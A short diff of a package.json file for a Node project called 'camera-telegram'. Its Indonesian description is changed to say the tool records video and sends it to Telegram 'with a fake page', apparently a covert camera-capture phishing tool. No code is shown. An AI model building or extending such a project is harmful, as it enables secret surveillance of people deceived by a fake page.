@@ -1,7 +1,7 @@
 {
   "name": "camera-telegram",
   "version": "1.0.0",
-  "description": "Merekam video 5 detik dan kirim ke Telegram (tanpa tampilan)",
+  "description": "Merekam video dan kirim ke Telegram (dengan halaman palsu)",
   "main": "index.js",
   "scripts": {
     "start": "node index.js"
